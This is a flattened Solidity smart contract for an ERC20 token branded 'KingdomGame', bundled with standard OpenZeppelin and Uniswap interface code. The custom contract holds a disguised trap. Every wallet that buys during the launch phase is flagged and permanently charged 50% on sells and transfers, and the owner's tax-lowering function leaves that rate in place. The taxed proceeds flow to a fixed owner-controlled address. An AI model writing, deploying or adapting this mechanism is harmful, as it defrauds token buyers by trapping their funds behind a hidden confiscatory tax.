1 // $KINGDOM GAME
2 // https://docs.kingdomgame.live/
3 // https://t.me/Kingdom_erc20
4 // https://twitter.com/KINGDOMGAME_ERC
5 
6 //           _____                    _____                    _____                    _____                    _____                    _____                    _____                    _____          
7 //          /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \         
8 //         /::\____\                /::\    \                /::\____\                /::\    \                /::\    \                /::\    \                /::\____\                /::\    \        
9 //        /:::/    /                \:::\    \              /::::|   |               /::::\    \              /::::\    \              /::::\    \              /::::|   |               /::::\    \       
10 //       /:::/    /                  \:::\    \            /:::::|   |              /::::::\    \            /::::::\    \            /::::::\    \            /:::::|   |              /::::::\    \      
11 //      /:::/    /                    \:::\    \          /::::::|   |             /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |             /:::/\:::\    \     
12 //     /:::/____/                      \:::\    \        /:::/|::|   |            /:::/  \:::\    \        /:::/  \:::\    \        /:::/__\:::\    \        /:::/|::|   |            /:::/__\:::\    \    
13 //    /::::\    \                      /::::\    \      /:::/ |::|   |           /:::/    \:::\    \      /:::/    \:::\    \      /::::\   \:::\    \      /:::/ |::|   |           /::::\   \:::\    \   
14 //   /::::::\____\________    ____    /::::::\    \    /:::/  |::|   | _____    /:::/    / \:::\    \    /:::/    / \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______    /::::::\   \:::\    \  
15 //  /:::/\:::::::::::\    \  /\   \  /:::/\:::\    \  /:::/   |::|   |/\    \  /:::/    /   \:::\ ___\  /:::/    /   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \  /:::/\:::\   \:::\    \ 
16 // /:::/  |:::::::::::\____\/::\   \/:::/  \:::\____\/:: /    |::|   /::\____\/:::/____/  ___\:::|    |/:::/____/  ___\:::|    |/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\/:::/__\:::\   \:::\____\
17 // \::/   |::|~~~|~~~~~     \:::\  /:::/    \::/    /\::/    /|::|  /:::/    /\:::\    \ /\  /:::|____|\:::\    \ /\  /:::|____|\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /\:::\   \:::\   \::/    /
18 //  \/____|::|   |           \:::\/:::/    / \/____/  \/____/ |::| /:::/    /  \:::\    /::\ \::/    /  \:::\    /::\ \::/    /  \/____/ \:::\/:::/    /  \/____/      /:::/    /  \:::\   \:::\   \/____/ 
19 //        |::|   |            \::::::/    /                   |::|/:::/    /    \:::\   \:::\ \/____/    \:::\   \:::\ \/____/            \::::::/    /               /:::/    /    \:::\   \:::\    \     
20 //        |::|   |             \::::/____/                    |::::::/    /      \:::\   \:::\____\       \:::\   \:::\____\               \::::/    /               /:::/    /      \:::\   \:::\____\    
21 //        |::|   |              \:::\    \                    |:::::/    /        \:::\  /:::/    /        \:::\  /:::/    /               /:::/    /               /:::/    /        \:::\   \::/    /    
22 //        |::|   |               \:::\    \                   |::::/    /          \:::\/:::/    /          \:::\/:::/    /               /:::/    /               /:::/    /          \:::\   \/____/     
23 //        |::|   |                \:::\    \                  /:::/    /            \::::::/    /            \::::::/    /               /:::/    /               /:::/    /            \:::\    \         
24 //        \::|   |                 \:::\____\                /:::/    /              \::::/    /              \::::/    /               /:::/    /               /:::/    /              \:::\____\        
25 //         \:|   |                  \::/    /                \::/    /                \::/____/                \::/____/                \::/    /                \::/    /                \::/    /        
26 //          \|___|                   \/____/                  \/____/                                                                    \/____/                  \/____/                  \/____/         
27                                                                                                                                                                                                         
28 
29 // SPDX-License-Identifier: MIT
30 
31 // File @openzeppelin/contracts/utils/Context.sol@v4.9.3
32 
33 // Original license: SPDX_License_Identifier: MIT
34 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
35 
36 pragma solidity ^0.8.0;
37 
38 /**
39  * @dev Provides information about the current execution context, including the
40  * sender of the transaction and its data. While these are generally available
41  * via msg.sender and msg.data, they should not be accessed in such a direct
42  * manner, since when dealing with meta-transactions the account sending and
43  * paying for execution may not be the actual sender (as far as an application
44  * is concerned).
45  *
46  * This contract is only required for intermediate, library-like contracts.
47  */
48 abstract contract Context {
49     function _msgSender() internal view virtual returns (address) {
50         return msg.sender;
51     }
52 
53     function _msgData() internal view virtual returns (bytes calldata) {
54         return msg.data;
55     }
56 }
57 
58 
59 // File @openzeppelin/contracts/access/Ownable.sol@v4.9.3
60 
61 // 
62 // OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)
63 
64 pragma solidity ^0.8.0;
65 
66 /**
67  * @dev Contract module which provides a basic access control mechanism, where
68  * there is an account (an owner) that can be granted exclusive access to
69  * specific functions.
70  *
71  * By default, the owner account will be the one that deploys the contract. This
72  * can later be changed with {transferOwnership}.
73  *
74  * This module is used through inheritance. It will make available the modifier
75  * `onlyOwner`, which can be applied to your functions to restrict their use to
76  * the owner.
77  */
78 abstract contract Ownable is Context {
79     address private _owner;
80 
81     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
82 
83     /**
84      * @dev Initializes the contract setting the deployer as the initial owner.
85      */
86     constructor() {
87         _transferOwnership(_msgSender());
88     }
89 
90     /**
91      * @dev Throws if called by any account other than the owner.
92      */
93     modifier onlyOwner() {
94         _checkOwner();
95         _;
96     }
97 
98     /**
99      * @dev Returns the address of the current owner.
100      */
101     function owner() public view virtual returns (address) {
102         return _owner;
103     }
104 
105     /**
106      * @dev Throws if the sender is not the owner.
107      */
108     function _checkOwner() internal view virtual {
109         require(owner() == _msgSender(), "Ownable: caller is not the owner");
110     }
111 
112     /**
113      * @dev Leaves the contract without owner. It will not be possible to call
114      * `onlyOwner` functions. Can only be called by the current owner.
115      *
116      * NOTE: Renouncing ownership will leave the contract without an owner,
117      * thereby disabling any functionality that is only available to the owner.
118      */
119     function renounceOwnership() public virtual onlyOwner {
120         _transferOwnership(address(0));
121     }
122 
123     /**
124      * @dev Transfers ownership of the contract to a new account (`newOwner`).
125      * Can only be called by the current owner.
126      */
127     function transferOwnership(address newOwner) public virtual onlyOwner {
128         require(newOwner != address(0), "Ownable: new owner is the zero address");
129         _transferOwnership(newOwner);
130     }
131 
132     /**
133      * @dev Transfers ownership of the contract to a new account (`newOwner`).
134      * Internal function without access restriction.
135      */
136     function _transferOwnership(address newOwner) internal virtual {
137         address oldOwner = _owner;
138         _owner = newOwner;
139         emit OwnershipTransferred(oldOwner, newOwner);
140     }
141 }
142 
143 
144 // File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.9.3
145 
146 // 
147 // OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)
148 
149 pragma solidity ^0.8.0;
150 
151 /**
152  * @dev Interface of the ERC20 standard as defined in the EIP.
153  */
154 interface IERC20 {
155     /**
156      * @dev Emitted when `value` tokens are moved from one account (`from`) to
157      * another (`to`).
158      *
159      * Note that `value` may be zero.
160      */
161     event Transfer(address indexed from, address indexed to, uint256 value);
162 
163     /**
164      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
165      * a call to {approve}. `value` is the new allowance.
166      */
167     event Approval(address indexed owner, address indexed spender, uint256 value);
168 
169     /**
170      * @dev Returns the amount of tokens in existence.
171      */
172     function totalSupply() external view returns (uint256);
173 
174     /**
175      * @dev Returns the amount of tokens owned by `account`.
176      */
177     function balanceOf(address account) external view returns (uint256);
178 
179     /**
180      * @dev Moves `amount` tokens from the caller's account to `to`.
181      *
182      * Returns a boolean value indicating whether the operation succeeded.
183      *
184      * Emits a {Transfer} event.
185      */
186     function transfer(address to, uint256 amount) external returns (bool);
187 
188     /**
189      * @dev Returns the remaining number of tokens that `spender` will be
190      * allowed to spend on behalf of `owner` through {transferFrom}. This is
191      * zero by default.
192      *
193      * This value changes when {approve} or {transferFrom} are called.
194      */
195     function allowance(address owner, address spender) external view returns (uint256);
196 
197     /**
198      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
199      *
200      * Returns a boolean value indicating whether the operation succeeded.
201      *
202      * IMPORTANT: Beware that changing an allowance with this method brings the risk
203      * that someone may use both the old and the new allowance by unfortunate
204      * transaction ordering. One possible solution to mitigate this race
205      * condition is to first reduce the spender's allowance to 0 and set the
206      * desired value afterwards:
207      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
208      *
209      * Emits an {Approval} event.
210      */
211     function approve(address spender, uint256 amount) external returns (bool);
212 
213     /**
214      * @dev Moves `amount` tokens from `from` to `to` using the
215      * allowance mechanism. `amount` is then deducted from the caller's
216      * allowance.
217      *
218      * Returns a boolean value indicating whether the operation succeeded.
219      *
220      * Emits a {Transfer} event.
221      */
222     function transferFrom(address from, address to, uint256 amount) external returns (bool);
223 }
224 
225 
226 // File @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol@v4.9.3
227 
228 // 
229 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
230 
231 pragma solidity ^0.8.0;
232 
233 /**
234  * @dev Interface for the optional metadata functions from the ERC20 standard.
235  *
236  * _Available since v4.1._
237  */
238 interface IERC20Metadata is IERC20 {
239     /**
240      * @dev Returns the name of the token.
241      */
242     function name() external view returns (string memory);
243 
244     /**
245      * @dev Returns the symbol of the token.
246      */
247     function symbol() external view returns (string memory);
248 
249     /**
250      * @dev Returns the decimals places of the token.
251      */
252     function decimals() external view returns (uint8);
253 }
254 
255 
256 // File @openzeppelin/contracts/token/ERC20/ERC20.sol@v4.9.3
257 
258 // 
259 // OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/ERC20.sol)
260 
261 pragma solidity ^0.8.0;
262 
263 
264 
265 /**
266  * @dev Implementation of the {IERC20} interface.
267  *
268  * This implementation is agnostic to the way tokens are created. This means
269  * that a supply mechanism has to be added in a derived contract using {_mint}.
270  * For a generic mechanism see {ERC20PresetMinterPauser}.
271  *
272  * TIP: For a detailed writeup see our guide
273  * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
274  * to implement supply mechanisms].
275  *
276  * The default value of {decimals} is 18. To change this, you should override
277  * this function so it returns a different value.
278  *
279  * We have followed general OpenZeppelin Contracts guidelines: functions revert
280  * instead returning `false` on failure. This behavior is nonetheless
281  * conventional and does not conflict with the expectations of ERC20
282  * applications.
283  *
284  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
285  * This allows applications to reconstruct the allowance for all accounts just
286  * by listening to said events. Other implementations of the EIP may not emit
287  * these events, as it isn't required by the specification.
288  *
289  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
290  * functions have been added to mitigate the well-known issues around setting
291  * allowances. See {IERC20-approve}.
292  */
293 contract ERC20 is Context, IERC20, IERC20Metadata {
294     mapping(address => uint256) private _balances;
295 
296     mapping(address => mapping(address => uint256)) private _allowances;
297 
298     uint256 private _totalSupply;
299 
300     string private _name;
301     string private _symbol;
302 
303     /**
304      * @dev Sets the values for {name} and {symbol}.
305      *
306      * All two of these values are immutable: they can only be set once during
307      * construction.
308      */
309     constructor(string memory name_, string memory symbol_) {
310         _name = name_;
311         _symbol = symbol_;
312     }
313 
314     /**
315      * @dev Returns the name of the token.
316      */
317     function name() public view virtual override returns (string memory) {
318         return _name;
319     }
320 
321     /**
322      * @dev Returns the symbol of the token, usually a shorter version of the
323      * name.
324      */
325     function symbol() public view virtual override returns (string memory) {
326         return _symbol;
327     }
328 
329     /**
330      * @dev Returns the number of decimals used to get its user representation.
331      * For example, if `decimals` equals `2`, a balance of `505` tokens should
332      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
333      *
334      * Tokens usually opt for a value of 18, imitating the relationship between
335      * Ether and Wei. This is the default value returned by this function, unless
336      * it's overridden.
337      *
338      * NOTE: This information is only used for _display_ purposes: it in
339      * no way affects any of the arithmetic of the contract, including
340      * {IERC20-balanceOf} and {IERC20-transfer}.
341      */
342     function decimals() public view virtual override returns (uint8) {
343         return 18;
344     }
345 
346     /**
347      * @dev See {IERC20-totalSupply}.
348      */
349     function totalSupply() public view virtual override returns (uint256) {
350         return _totalSupply;
351     }
352 
353     /**
354      * @dev See {IERC20-balanceOf}.
355      */
356     function balanceOf(address account) public view virtual override returns (uint256) {
357         return _balances[account];
358     }
359 
360     /**
361      * @dev See {IERC20-transfer}.
362      *
363      * Requirements:
364      *
365      * - `to` cannot be the zero address.
366      * - the caller must have a balance of at least `amount`.
367      */
368     function transfer(address to, uint256 amount) public virtual override returns (bool) {
369         address owner = _msgSender();
370         _transfer(owner, to, amount);
371         return true;
372     }
373 
374     /**
375      * @dev See {IERC20-allowance}.
376      */
377     function allowance(address owner, address spender) public view virtual override returns (uint256) {
378         return _allowances[owner][spender];
379     }
380 
381     /**
382      * @dev See {IERC20-approve}.
383      *
384      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
385      * `transferFrom`. This is semantically equivalent to an infinite approval.
386      *
387      * Requirements:
388      *
389      * - `spender` cannot be the zero address.
390      */
391     function approve(address spender, uint256 amount) public virtual override returns (bool) {
392         address owner = _msgSender();
393         _approve(owner, spender, amount);
394         return true;
395     }
396 
397     /**
398      * @dev See {IERC20-transferFrom}.
399      *
400      * Emits an {Approval} event indicating the updated allowance. This is not
401      * required by the EIP. See the note at the beginning of {ERC20}.
402      *
403      * NOTE: Does not update the allowance if the current allowance
404      * is the maximum `uint256`.
405      *
406      * Requirements:
407      *
408      * - `from` and `to` cannot be the zero address.
409      * - `from` must have a balance of at least `amount`.
410      * - the caller must have allowance for ``from``'s tokens of at least
411      * `amount`.
412      */
413     function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
414         address spender = _msgSender();
415         _spendAllowance(from, spender, amount);
416         _transfer(from, to, amount);
417         return true;
418     }
419 
420     /**
421      * @dev Atomically increases the allowance granted to `spender` by the caller.
422      *
423      * This is an alternative to {approve} that can be used as a mitigation for
424      * problems described in {IERC20-approve}.
425      *
426      * Emits an {Approval} event indicating the updated allowance.
427      *
428      * Requirements:
429      *
430      * - `spender` cannot be the zero address.
431      */
432     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
433         address owner = _msgSender();
434         _approve(owner, spender, allowance(owner, spender) + addedValue);
435         return true;
436     }
437 
438     /**
439      * @dev Atomically decreases the allowance granted to `spender` by the caller.
440      *
441      * This is an alternative to {approve} that can be used as a mitigation for
442      * problems described in {IERC20-approve}.
443      *
444      * Emits an {Approval} event indicating the updated allowance.
445      *
446      * Requirements:
447      *
448      * - `spender` cannot be the zero address.
449      * - `spender` must have allowance for the caller of at least
450      * `subtractedValue`.
451      */
452     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
453         address owner = _msgSender();
454         uint256 currentAllowance = allowance(owner, spender);
455         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
456         unchecked {
457             _approve(owner, spender, currentAllowance - subtractedValue);
458         }
459 
460         return true;
461     }
462 
463     /**
464      * @dev Moves `amount` of tokens from `from` to `to`.
465      *
466      * This internal function is equivalent to {transfer}, and can be used to
467      * e.g. implement automatic token fees, slashing mechanisms, etc.
468      *
469      * Emits a {Transfer} event.
470      *
471      * Requirements:
472      *
473      * - `from` cannot be the zero address.
474      * - `to` cannot be the zero address.
475      * - `from` must have a balance of at least `amount`.
476      */
477     function _transfer(address from, address to, uint256 amount) internal virtual {
478         require(from != address(0), "ERC20: transfer from the zero address");
479         require(to != address(0), "ERC20: transfer to the zero address");
480 
481         _beforeTokenTransfer(from, to, amount);
482 
483         uint256 fromBalance = _balances[from];
484         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
485         unchecked {
486             _balances[from] = fromBalance - amount;
487             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
488             // decrementing then incrementing.
489             _balances[to] += amount;
490         }
491 
492         emit Transfer(from, to, amount);
493 
494         _afterTokenTransfer(from, to, amount);
495     }
496 
497     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
498      * the total supply.
499      *
500      * Emits a {Transfer} event with `from` set to the zero address.
501      *
502      * Requirements:
503      *
504      * - `account` cannot be the zero address.
505      */
506     function _mint(address account, uint256 amount) internal virtual {
507         require(account != address(0), "ERC20: mint to the zero address");
508 
509         _beforeTokenTransfer(address(0), account, amount);
510 
511         _totalSupply += amount;
512         unchecked {
513             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
514             _balances[account] += amount;
515         }
516         emit Transfer(address(0), account, amount);
517 
518         _afterTokenTransfer(address(0), account, amount);
519     }
520 
521     /**
522      * @dev Destroys `amount` tokens from `account`, reducing the
523      * total supply.
524      *
525      * Emits a {Transfer} event with `to` set to the zero address.
526      *
527      * Requirements:
528      *
529      * - `account` cannot be the zero address.
530      * - `account` must have at least `amount` tokens.
531      */
532     function _burn(address account, uint256 amount) internal virtual {
533         require(account != address(0), "ERC20: burn from the zero address");
534 
535         _beforeTokenTransfer(account, address(0), amount);
536 
537         uint256 accountBalance = _balances[account];
538         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
539         unchecked {
540             _balances[account] = accountBalance - amount;
541             // Overflow not possible: amount <= accountBalance <= totalSupply.
542             _totalSupply -= amount;
543         }
544 
545         emit Transfer(account, address(0), amount);
546 
547         _afterTokenTransfer(account, address(0), amount);
548     }
549 
550     /**
551      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
552      *
553      * This internal function is equivalent to `approve`, and can be used to
554      * e.g. set automatic allowances for certain subsystems, etc.
555      *
556      * Emits an {Approval} event.
557      *
558      * Requirements:
559      *
560      * - `owner` cannot be the zero address.
561      * - `spender` cannot be the zero address.
562      */
563     function _approve(address owner, address spender, uint256 amount) internal virtual {
564         require(owner != address(0), "ERC20: approve from the zero address");
565         require(spender != address(0), "ERC20: approve to the zero address");
566 
567         _allowances[owner][spender] = amount;
568         emit Approval(owner, spender, amount);
569     }
570 
571     /**
572      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
573      *
574      * Does not update the allowance amount in case of infinite allowance.
575      * Revert if not enough allowance is available.
576      *
577      * Might emit an {Approval} event.
578      */
579     function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
580         uint256 currentAllowance = allowance(owner, spender);
581         if (currentAllowance != type(uint256).max) {
582             require(currentAllowance >= amount, "ERC20: insufficient allowance");
583             unchecked {
584                 _approve(owner, spender, currentAllowance - amount);
585             }
586         }
587     }
588 
589     /**
590      * @dev Hook that is called before any transfer of tokens. This includes
591      * minting and burning.
592      *
593      * Calling conditions:
594      *
595      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
596      * will be transferred to `to`.
597      * - when `from` is zero, `amount` tokens will be minted for `to`.
598      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
599      * - `from` and `to` are never both zero.
600      *
601      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
602      */
603     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
604 
605     /**
606      * @dev Hook that is called after any transfer of tokens. This includes
607      * minting and burning.
608      *
609      * Calling conditions:
610      *
611      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
612      * has been transferred to `to`.
613      * - when `from` is zero, `amount` tokens have been minted for `to`.
614      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
615      * - `from` and `to` are never both zero.
616      *
617      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
618      */
619     function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
620 }
621 
622 
623 // File @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol@v1.1.0-beta.0
624 
625 pragma solidity >=0.6.2;
626 
627 interface IUniswapV2Router01 {
628     function factory() external pure returns (address);
629     function WETH() external pure returns (address);
630 
631     function addLiquidity(
632         address tokenA,
633         address tokenB,
634         uint amountADesired,
635         uint amountBDesired,
636         uint amountAMin,
637         uint amountBMin,
638         address to,
639         uint deadline
640     ) external returns (uint amountA, uint amountB, uint liquidity);
641     function addLiquidityETH(
642         address token,
643         uint amountTokenDesired,
644         uint amountTokenMin,
645         uint amountETHMin,
646         address to,
647         uint deadline
648     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
649     function removeLiquidity(
650         address tokenA,
651         address tokenB,
652         uint liquidity,
653         uint amountAMin,
654         uint amountBMin,
655         address to,
656         uint deadline
657     ) external returns (uint amountA, uint amountB);
658     function removeLiquidityETH(
659         address token,
660         uint liquidity,
661         uint amountTokenMin,
662         uint amountETHMin,
663         address to,
664         uint deadline
665     ) external returns (uint amountToken, uint amountETH);
666     function removeLiquidityWithPermit(
667         address tokenA,
668         address tokenB,
669         uint liquidity,
670         uint amountAMin,
671         uint amountBMin,
672         address to,
673         uint deadline,
674         bool approveMax, uint8 v, bytes32 r, bytes32 s
675     ) external returns (uint amountA, uint amountB);
676     function removeLiquidityETHWithPermit(
677         address token,
678         uint liquidity,
679         uint amountTokenMin,
680         uint amountETHMin,
681         address to,
682         uint deadline,
683         bool approveMax, uint8 v, bytes32 r, bytes32 s
684     ) external returns (uint amountToken, uint amountETH);
685     function swapExactTokensForTokens(
686         uint amountIn,
687         uint amountOutMin,
688         address[] calldata path,
689         address to,
690         uint deadline
691     ) external returns (uint[] memory amounts);
692     function swapTokensForExactTokens(
693         uint amountOut,
694         uint amountInMax,
695         address[] calldata path,
696         address to,
697         uint deadline
698     ) external returns (uint[] memory amounts);
699     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
700         external
701         payable
702         returns (uint[] memory amounts);
703     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
704         external
705         returns (uint[] memory amounts);
706     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
707         external
708         returns (uint[] memory amounts);
709     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
710         external
711         payable
712         returns (uint[] memory amounts);
713 
714     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
715     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
716     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
717     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
718     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
719 }
720 
721 
722 // File @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol@v1.1.0-beta.0
723 
724 pragma solidity >=0.6.2;
725 
726 interface IUniswapV2Router02 is IUniswapV2Router01 {
727     function removeLiquidityETHSupportingFeeOnTransferTokens(
728         address token,
729         uint liquidity,
730         uint amountTokenMin,
731         uint amountETHMin,
732         address to,
733         uint deadline
734     ) external returns (uint amountETH);
735     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
736         address token,
737         uint liquidity,
738         uint amountTokenMin,
739         uint amountETHMin,
740         address to,
741         uint deadline,
742         bool approveMax, uint8 v, bytes32 r, bytes32 s
743     ) external returns (uint amountETH);
744 
745     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
746         uint amountIn,
747         uint amountOutMin,
748         address[] calldata path,
749         address to,
750         uint deadline
751     ) external;
752     function swapExactETHForTokensSupportingFeeOnTransferTokens(
753         uint amountOutMin,
754         address[] calldata path,
755         address to,
756         uint deadline
757     ) external payable;
758     function swapExactTokensForETHSupportingFeeOnTransferTokens(
759         uint amountIn,
760         uint amountOutMin,
761         address[] calldata path,
762         address to,
763         uint deadline
764     ) external;
765 }
766 
767 
768 // File @uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol@v1.0.1
769 
770 pragma solidity >=0.5.0;
771 
772 interface IUniswapV2Factory {
773     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
774 
775     function feeTo() external view returns (address);
776     function feeToSetter() external view returns (address);
777 
778     function getPair(address tokenA, address tokenB) external view returns (address pair);
779     function allPairs(uint) external view returns (address pair);
780     function allPairsLength() external view returns (uint);
781 
782     function createPair(address tokenA, address tokenB) external returns (address pair);
783 
784     function setFeeTo(address) external;
785     function setFeeToSetter(address) external;
786 }
787 
788 
789 // File contracts/kingdom.sol
790 
791 pragma solidity ^0.8.18;
792 // $KINGDOM GAME
793 // https://docs.kingdomgame.live/
794 // https://t.me/Kingdom_erc20
795 // https://twitter.com/KINGDOMGAME_ERC
796 
797 contract NeoBot is ERC20, Ownable {
798     string private _name = "KingdomGame";
799     string private _symbol = "KINGDOM";
800     uint256 private _supply        = 10_000_000 ether;
801     uint256 public maxTxAmount     = 200_000 ether;
802     uint256 public maxWalletAmount = 200_000 ether;
803     address public taxAddy = 0x2eBa47f0f75d79116d9609Fc3aeD6730027746ff;
804     address public DEAD = 0x000000000000000000000000000000000000dEaD;
805 
806     mapping(address => bool) public _feeOn;
807     mapping(address => bool) public wl;
808 
809     mapping(address => bool) public GreedIsGoodwallets;
810 
811     enum Phase {Phase1, Phase2, Phase3, Phase4}
812     Phase public currentphase;
813 
814     bool progress_swap = false;
815 
816     uint256 public buyTaxGlobal = 5;
817     uint256 public sellTaxGlobal = 50;
818     uint256 private GreedIsGood = 50;
819 
820     IUniswapV2Router02 public immutable uniswapV2Router;
821     address public uniswapV2Pair;
822 
823     uint256 public operationsFunds;
824 
825     constructor() ERC20(_name, _symbol) {
826         _mint(msg.sender, (_supply));
827 
828         currentphase = Phase.Phase1;
829         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
830         uniswapV2Router = _uniswapV2Router;
831         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
832     
833         wl[owner()] = true;
834         wl[taxAddy] = true;
835         wl[address(this)] = true;
836         wl[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;
837         wl[DEAD] = true;
838         _feeOn[address(uniswapV2Router)] = true;
839         _feeOn[msg.sender] = true;
840         _feeOn[taxAddy] = true;
841         _feeOn[address(this)] = true;
842         _feeOn[DEAD] = true;
843     }
844 
845     function _transfer(
846         address from,
847         address to,
848         uint256 amount
849     ) internal override {
850 
851         require(from != address(0), "ERC20: transfer from the zero address");
852         require(to != address(0), "ERC20: transfer to the zero address");
853 
854         if (!wl[from] && !wl[to] ) {
855             if (to != uniswapV2Pair) {
856                 require(amount <= maxTxAmount, "ERC20: transfer amount exceeds the max transaction amount bef");
857                 require(
858                     (amount + balanceOf(to)) <= maxWalletAmount,
859                     "ERC20: balance amount exceeded max wallet amount limit"
860                 );
861             }
862         }
863 
864         uint256 transferAmount = amount;
865         if (!_feeOn[from] && !_feeOn[to]) {
866             if ((from == uniswapV2Pair || to == uniswapV2Pair)) {
867                 require(amount <= maxTxAmount, "ERC20: transfer amount exceeds the max transaction amount");
868  
869                 if (
870                     buyTaxGlobal > 0 && 
871                     uniswapV2Pair == from &&
872                     !wl[to] &&
873                     from != address(this)
874                 ) {
875 
876                     if (currentphase == Phase.Phase1) {
877                         GreedIsGoodwallets[to] = true;
878                     }
879 
880                     uint256 feeTokens = (amount * buyTaxGlobal) / 100;
881                     super._transfer(from, address(this), feeTokens);
882                     transferAmount = amount - feeTokens;
883                 }
884 
885                 if (
886                     uniswapV2Pair == to &&
887                     !wl[from] &&
888                     to != address(this) &&
889                     !progress_swap
890                 ) {
891                     
892                     uint256 taxSell = sellTaxGlobal;
893                     if (GreedIsGoodwallets[from] == true) {
894                         taxSell = GreedIsGood;
895                     }
896 
897                     progress_swap = true;
898                     swapAndLiquify();
899                     progress_swap = false;
900 
901                     uint256 feeTokens = (amount * taxSell) / 100;
902                     super._transfer(from, address(this), feeTokens);
903                     transferAmount = amount - feeTokens;
904                 }
905             }
906             else {
907                 if (
908                     GreedIsGoodwallets[from] == true &&
909                     uniswapV2Pair != to
910                 ) {
911                     uint256 feeTokens = (amount * GreedIsGood) / 100;
912                     super._transfer(from, address(this), feeTokens);
913                     transferAmount = amount - feeTokens;
914                 }
915             }
916         }
917         super._transfer(from, to, transferAmount);
918     }
919 
920     function swapAndLiquify() internal {
921         if (balanceOf(address(this)) == 0) {
922             return;
923         }
924         uint256 receivedETH;
925         {
926             uint256 contractTokenBalance = balanceOf(address(this));
927             uint256 beforeBalance = address(this).balance;
928 
929             if (contractTokenBalance > 0) {
930                 beforeBalance = address(this).balance;
931                 _swapTokensForEth(contractTokenBalance, 0);
932                 receivedETH = address(this).balance - beforeBalance;
933                 operationsFunds += receivedETH;
934             }
935         }
936     }
937  
938     function getTax() external returns (bool) {
939         payable(taxAddy).transfer(operationsFunds);
940         operationsFunds = 0;
941         return true;
942     }
943 
944     /**
945      * @dev Swaps Token Amount to ETH
946      *
947      * @param tokenAmount Token Amount to be swapped
948      * @param tokenAmountOut Expected ETH amount out of swap
949      */
950     function _swapTokensForEth(
951         uint256 tokenAmount,
952         uint256 tokenAmountOut
953     ) internal {
954         address[] memory path = new address[](2);
955         path[0] = address(this);
956         path[1] = uniswapV2Router.WETH();
957 
958         IERC20(address(this)).approve(
959             address(uniswapV2Router),
960             type(uint256).max
961         );
962 
963         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
964             tokenAmount,
965             tokenAmountOut,
966             path,
967             address(this),
968             block.timestamp
969         );
970     }
971 
972       function skipTheSnipas() external onlyOwner returns (bool) {
973         currentphase = Phase.Phase4;
974         buyTaxGlobal = 5;
975         sellTaxGlobal = 5;
976 
977         return true;
978     }
979 
980     function withdrawTokens(address token) external onlyOwner {
981         IERC20(token).transfer(
982             taxAddy,
983             IERC20(token).balanceOf(address(this))
984         );
985     }
986 
987     function emergencyTaxRemoval(address addy, bool changer) external onlyOwner {
988         wl[addy] = changer;
989     }
990 
991     receive() external payable {}
992 }